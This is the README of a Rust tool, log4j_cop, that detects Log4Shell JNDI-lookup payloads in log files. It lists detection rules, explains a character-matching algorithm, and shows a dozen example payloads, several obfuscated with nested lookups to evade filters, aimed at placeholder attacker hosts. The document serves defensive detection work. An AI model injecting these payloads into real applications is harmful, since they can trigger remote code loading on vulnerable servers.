# log4j_cop

Detect log4j payloads from a log file.

**Usage through cargo:**

```bash
cargo run -- <LOG_FILE>
```

**Or build the binary for release:**

1. `cargo build --release`

```bash
./target/release/log4j_cop <LOG_FILE>
```

## Rules

Currently the following rules (and variants) are being accounted for:

* ${jndi:ldap://
* ${jndi:rmi://
* ${jndi:ldaps:/
* ${jndi:dns:/
* ${jndi:nis:/
* ${jndi:nds:/
* ${jndi:corba:/
* ${jndi:iiop:/

We are also taking into account:

* Mixed case payloads
* URL encoded payloads

## Algorithm

Each line is broken into characters and we check whether these characters match
one of our rulesets in the correct order, ignoring characters that do not match.

## Examples being matched

```
${jndi:ldap://whatever.com/z}
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```
